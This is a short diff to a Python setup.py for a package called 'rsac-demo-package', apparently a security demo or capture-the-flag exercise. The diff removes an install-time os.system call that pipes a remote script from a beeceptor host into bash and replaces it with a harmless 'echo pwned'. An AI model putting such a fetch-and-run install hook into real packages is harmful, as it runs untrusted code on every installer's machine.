@@ -1,6 +1,6 @@
 from setuptools import setup
 import os
-os.system("curl -s https://heroctf-ploc.free.beeceptor.com | bash")  # Executes remote shell script
+os.system("echo pwned")  # Executes remote shell script
 setup(
 
     name="rsac-demo-package",
